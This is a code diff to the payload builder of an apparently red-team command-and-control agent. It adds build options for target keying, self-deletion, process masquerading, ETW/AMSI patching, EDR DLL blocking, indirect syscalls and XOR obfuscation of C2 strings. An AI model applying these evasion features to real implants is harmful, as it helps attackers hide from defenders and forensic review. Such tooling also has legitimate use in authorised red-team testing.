@@ -2,7 +2,10 @@ package agentfunctions
 
 import (
 	"bytes"
+	cryptorand "crypto/rand"
+	"encoding/base64"
 	"encoding/binary"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -145,6 +148,76 @@ var payloadDefinition = agentstructs.PayloadType{
 			DefaultValue:  "",
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
 		},
+		{
+			Name:          "env_key_hostname",
+			Description:   "Optional: Environment key — regex pattern the hostname must match (e.g. '.*\\.contoso\\.com' or 'WORKSTATION-\\d+'). Agent exits silently before checkin if hostname doesn't match. Leave empty to skip.",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "env_key_domain",
+			Description:   "Optional: Environment key — regex pattern the domain must match (e.g. 'CONTOSO' or '.*\\.local'). Agent exits silently before checkin if domain doesn't match. Leave empty to skip.",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "env_key_username",
+			Description:   "Optional: Environment key — regex pattern the current username must match (e.g. 'admin.*' or 'svc_.*'). Agent exits silently before checkin if username doesn't match. Leave empty to skip.",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "env_key_process",
+			Description:   "Optional: Environment key — process name that must be running on the system (e.g. 'outlook.exe' or 'slack'). Agent exits silently before checkin if process not found. Leave empty to skip.",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "self_delete",
+			Description:   "Delete the agent binary from disk after execution starts. Reduces forensic artifacts. On Linux/macOS, the file is removed immediately (process continues from memory). On Windows, uses NTFS stream rename technique.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
+		{
+			Name:          "masquerade_name",
+			Description:   "Optional: Masquerade the agent process name on Linux. Changes /proc/self/comm (visible in ps, top, htop). Max 15 chars. Examples: '[kworker/0:1]', 'sshd', 'apache2', '[migration/0]'. Leave empty to skip.",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
+			Name:          "auto_patch",
+			Description:   "Automatically patch ETW (EtwEventWrite) and AMSI (AmsiScanBuffer) at agent startup. Prevents ETW-based detection and AMSI scanning before any agent activity. Windows only — no-op on Linux/macOS.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
+		{
+			Name:          "obfuscate_strings",
+			Description:   "XOR-encode C2 config strings (callback host, URIs, user agent, encryption key, UUID) at build time. Prevents trivial IOC extraction via 'strings' on the binary. Decoded at runtime with a per-build random key.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
+		{
+			Name:          "block_dlls",
+			Description:   "Block non-Microsoft DLLs from being loaded in child processes spawned by the agent (run, powershell). Prevents EDR from injecting monitoring DLLs. Windows only — no-op on Linux/macOS.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
+		{
+			Name:          "indirect_syscalls",
+			Description:   "Enable indirect syscalls at startup. Resolves Nt* syscall numbers from ntdll export table and generates stubs that jump to ntdll's syscall;ret gadget. Injection commands will use indirect syscalls to bypass userland API hooks. Windows only — no-op on Linux/macOS.",
+			Required:      false,
+			DefaultValue:  false,
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
+		},
 	},
 	BuildSteps: []agentstructs.BuildStep{
 		{
@@ -241,6 +314,18 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 			if userAgentVal, exists := headerMap["User-Agent"]; exists {
 				ldflags += fmt.Sprintf(" -X '%s.userAgent=%s'", fawkes_main_package, userAgentVal)
 			}
+			// Pass all custom headers (excluding User-Agent) as base64-encoded JSON
+			extraHeaders := make(map[string]string)
+			for k, v := range headerMap {
+				if k != "User-Agent" {
+					extraHeaders[k] = v
+				}
+			}
+			if len(extraHeaders) > 0 {
+				jsonBytes, _ := json.Marshal(extraHeaders)
+				encoded := base64.StdEncoding.EncodeToString(jsonBytes)
+				ldflags += fmt.Sprintf(" -X '%s.customHeaders=%s'", fawkes_main_package, encoded)
+			}
 		} else if key == "get_uri" {
 			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
 			if err != nil {
@@ -285,6 +370,117 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	}
 	if whDays, err := payloadBuildMsg.BuildParameters.GetStringArg("working_days"); err == nil && whDays != "" {
 		ldflags += fmt.Sprintf(" -X '%s.workingDays=%s'", fawkes_main_package, whDays)
+	}
+
+	// Environment keying / guardrails
+	if ekHostname, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_hostname"); err == nil && ekHostname != "" {
+		ldflags += fmt.Sprintf(" -X '%s.envKeyHostname=%s'", fawkes_main_package, ekHostname)
+	}
+	if ekDomain, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_domain"); err == nil && ekDomain != "" {
+		ldflags += fmt.Sprintf(" -X '%s.envKeyDomain=%s'", fawkes_main_package, ekDomain)
+	}
+	if ekUsername, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_username"); err == nil && ekUsername != "" {
+		ldflags += fmt.Sprintf(" -X '%s.envKeyUsername=%s'", fawkes_main_package, ekUsername)
+	}
+	if ekProcess, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_process"); err == nil && ekProcess != "" {
+		ldflags += fmt.Sprintf(" -X '%s.envKeyProcess=%s'", fawkes_main_package, ekProcess)
+	}
+	if selfDel, err := payloadBuildMsg.BuildParameters.GetBooleanArg("self_delete"); err == nil && selfDel {
+		ldflags += fmt.Sprintf(" -X '%s.selfDelete=true'", fawkes_main_package)
+	}
+	if masqName, err := payloadBuildMsg.BuildParameters.GetStringArg("masquerade_name"); err == nil && masqName != "" {
+		ldflags += fmt.Sprintf(" -X '%s.masqueradeName=%s'", fawkes_main_package, masqName)
+	}
+	if autoPatch, err := payloadBuildMsg.BuildParameters.GetBooleanArg("auto_patch"); err == nil && autoPatch {
+		ldflags += fmt.Sprintf(" -X '%s.autoPatch=true'", fawkes_main_package)
+	}
+	if blockDlls, err := payloadBuildMsg.BuildParameters.GetBooleanArg("block_dlls"); err == nil && blockDlls {
+		ldflags += fmt.Sprintf(" -X '%s.blockDLLs=true'", fawkes_main_package)
+	}
+	if indSyscalls, err := payloadBuildMsg.BuildParameters.GetBooleanArg("indirect_syscalls"); err == nil && indSyscalls {
+		ldflags += fmt.Sprintf(" -X '%s.indirectSyscalls=true'", fawkes_main_package)
+	}
+
+	// String obfuscation: XOR-encode C2 config strings with a random key
+	if obfStrings, err := payloadBuildMsg.BuildParameters.GetBooleanArg("obfuscate_strings"); err == nil && obfStrings {
+		xorKey := make([]byte, 32)
+		if _, err := cryptorand.Read(xorKey); err != nil {
+			payloadBuildResponse.Success = false
+			payloadBuildResponse.BuildStdErr = fmt.Sprintf("Failed to generate XOR key: %v", err)
+			return payloadBuildResponse
+		}
+		xorKeyB64 := base64.StdEncoding.EncodeToString(xorKey)
+		ldflags += fmt.Sprintf(" -X '%s.xorKey=%s'", fawkes_main_package, xorKeyB64)
+
+		// Re-encode the C2 config strings already in ldflags by replacing them
+		// We need to extract, encode, and re-inject. Simpler approach: use a post-processing
+		// pass that finds and replaces known variable values.
+		// Instead, we'll set a flag and the variables were already added above as plaintext.
+		// The agent will decode them at runtime using the key.
+
+		// For string obfuscation we need to re-write the ldflags with encoded values.
+		// The approach: rebuild ldflags for the obfuscatable variables.
+		// First, extract the current values that were set, then rebuild with encoding.
+		type obfVar struct {
+			name  string
+			value string
+		}
+		var obfVars []obfVar
+
+		// Extract C2 profile string values for re-encoding
+		for _, key := range payloadBuildMsg.C2Profiles[0].GetArgNames() {
+			switch key {
+			case "callback_host":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"callbackHost", val})
+				}
+			case "callback_port":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"callbackPort", fmt.Sprintf("%d", int(val))})
+				}
+			case "get_uri":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"getURI", val})
+				}
+			case "post_uri":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"postURI", val})
+				}
+			case "headers":
+				if headerMap, err := payloadBuildMsg.C2Profiles[0].GetDictionaryArg(key); err == nil {
+					if uaVal, exists := headerMap["User-Agent"]; exists {
+						obfVars = append(obfVars, obfVar{"userAgent", uaVal})
+					}
+				}
+			case "AESPSK":
+				if cryptoVal, err := payloadBuildMsg.C2Profiles[0].GetCryptoArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"encryptionKey", cryptoVal.EncKey})
+				}
+			}
+		}
+		// Also encode payloadUUID, hostHeader, proxyURL, customHeaders
+		obfVars = append(obfVars, obfVar{"payloadUUID", payloadBuildMsg.PayloadUUID})
+		if hostHeader, err := payloadBuildMsg.BuildParameters.GetStringArg("host_header"); err == nil && hostHeader != "" {
+			obfVars = append(obfVars, obfVar{"hostHeader", hostHeader})
+		}
+		if proxyURL, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_url"); err == nil && proxyURL != "" {
+			obfVars = append(obfVars, obfVar{"proxyURL", proxyURL})
+		}
+
+		// Replace plaintext values in ldflags with XOR-encoded versions
+		for _, v := range obfVars {
+			plainPattern := fmt.Sprintf("-X '%s.%s=%s'", fawkes_main_package, v.name, v.value)
+			encodedVal := xorEncodeString(v.value, xorKey)
+			encodedPattern := fmt.Sprintf("-X '%s.%s=%s'", fawkes_main_package, v.name, encodedVal)
+			ldflags = strings.Replace(ldflags, plainPattern, encodedPattern, 1)
+		}
+		// customHeaders is already base64 — re-encode the base64 string itself
+		if customHeadersB64 := extractLdflagValue(ldflags, fawkes_main_package, "customHeaders"); customHeadersB64 != "" {
+			plainPattern := fmt.Sprintf("-X '%s.customHeaders=%s'", fawkes_main_package, customHeadersB64)
+			encodedVal := xorEncodeString(customHeadersB64, xorKey)
+			encodedPattern := fmt.Sprintf("-X '%s.customHeaders=%s'", fawkes_main_package, encodedVal)
+			ldflags = strings.Replace(ldflags, plainPattern, encodedPattern, 1)
+		}
 	}
 
 	architecture, err := payloadBuildMsg.BuildParameters.GetStringArg("architecture")
@@ -541,6 +737,34 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 
 	//payloadBuildResponse.Status = agentstructs.PAYLOAD_BUILD_STATUS_ERROR
 	return payloadBuildResponse
+}
+
+// extractLdflagValue extracts the value of a variable from ldflags string.
+func extractLdflagValue(ldflags, pkg, varName string) string {
+	prefix := fmt.Sprintf("-X '%s.%s=", pkg, varName)
+	idx := strings.Index(ldflags, prefix)
+	if idx < 0 {
+		return ""
+	}
+	start := idx + len(prefix)
+	end := strings.Index(ldflags[start:], "'")
+	if end < 0 {
+		return ""
+	}
+	return ldflags[start : start+end]
+}
+
+// xorEncodeString XOR-encodes a plaintext string with the given key and returns base64.
+func xorEncodeString(plaintext string, key []byte) string {
+	if len(key) == 0 || plaintext == "" {
+		return plaintext
+	}
+	data := []byte(plaintext)
+	result := make([]byte, len(data))
+	for i, b := range data {
+		result[i] = b ^ key[i%len(key)]
+	}
+	return base64.StdEncoding.EncodeToString(result)
 }
 
 func Initialize() {
